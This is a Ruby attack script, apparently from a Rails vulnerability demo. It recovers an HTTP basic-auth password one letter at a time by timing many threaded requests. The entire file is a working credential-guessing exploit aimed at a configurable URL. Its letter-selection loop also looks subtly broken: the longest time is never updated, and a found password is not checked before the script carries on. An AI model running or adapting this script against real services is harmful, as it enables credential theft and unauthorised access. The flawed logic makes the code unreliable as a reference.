require 'net/http'
require 'optparse'
require 'securerandom'
require 'thread/pool'

options = {
  :url => 'http://localhost:3000/rails_vulnerabilities/authenticated_page',
  :threads => 8,
  :iterations => 500
}
opt_parser = OptionParser.new do |opts|
  opts.banner = 'Usage: reflector.rb [options]'
  opts.on('-u', '--url [URL]', String, 'Set url of page to break') do |u|
    options[:url] = u
  end
  opts.on('-t', '--threads [THREADS]', Integer, 'Number of threads to use') do |t|
    options[:threads] = t
  end
  opts.on('-i', '--iterations [ITERATIONS]', Integer, 'Number of iterations per candidate') do |i|
    options[:iterations] = i
  end
  opts.on_tail('-h', '--help', 'Show this message') do 
    puts opts
    exit
  end
end

opt_parser.parse!(ARGV)

puts options

pw = ""
candidates = ('a'..'z').to_a
uri = URI(options[:url])

ITERATIONS = options[:iterations]
actual_pw = nil

pool = Thread.pool(options[:threads])

loop do

  times = {}
  workload = []

  candidates.each do |candidate|
    times[candidate] = 0.0         
    ITERATIONS.times do
      workload.push({:candidate => candidate, :order => SecureRandom.random_number(ITERATIONS * ITERATIONS * candidates.length)})
    end
  end

  workload.sort_by!{ |w| w[:order] }

  slice_size = workload.length / options[:threads]

  thread_workloads = workload.each_slice(slice_size).to_a

  iteration_begin_time = Time.now

  thread_workloads.each.with_index do |tw, i|
    puts "Thread #{i} has #{tw.length} work"
    pool.process do
      begin
        Net::HTTP.start(uri.hostname, uri.port) do |http|
          tw.each do |work|
            start_time = Time.now
            req = Net::HTTP::Get.new(uri)
            req.basic_auth 'me', pw + work[:candidate]
            res = http.request(req)
            work[:time_elapsed] = Time.now - start_time
            if res.code == '200'
              actual_pw = pw + work[:candidate]
              break
            end
          end
        end
      rescue Exception => e
        puts "Thread #{i} raised #{e}"
        puts e.backtrace.join("\n")
      end
    end
  end


  pool.wait(:done)
  puts "Letter #{pw.length} took #{Time.now - iteration_begin_time} seconds"

  workload.each do |work|
    times[work[:candidate]] += work[:time_elapsed]
  end

  choice = times.keys.first
  longest_time = times[choice]
  times.each do |c, t|
    choice = c if t > longest_time
  end

  pw += choice
  puts "password is now #{pw}"

  if pw.length > 16
    puts "bailing out"
    break
  end
end

puts pw